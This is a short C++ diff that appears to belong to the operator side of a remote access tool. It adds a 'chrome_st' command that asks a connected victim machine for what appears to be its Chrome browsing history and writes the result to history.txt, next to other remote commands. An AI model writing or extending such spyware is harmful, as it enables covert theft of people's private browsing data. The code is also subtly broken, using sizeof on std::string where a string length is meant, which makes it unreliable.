@@ -269,6 +269,13 @@ int main() {
 				send(conn, path.c_str(), sizeof(path), NULL);
 				std::cout << "ok\n";
 			}
+			else if (command == "chrome_st") {
+				send(conn, command.c_str(), sizeof(command), NULL);
+				recv(conn, buffer, sizeof(buffer), NULL);
+				std::ofstream history("history.txt");
+				history << buffer;
+				std::cout << "history write history.txt" << std::endl;
+			}
 
 			else if (command == "close") {
 				send(conn, command.c_str(), sizeof(command), NULL);
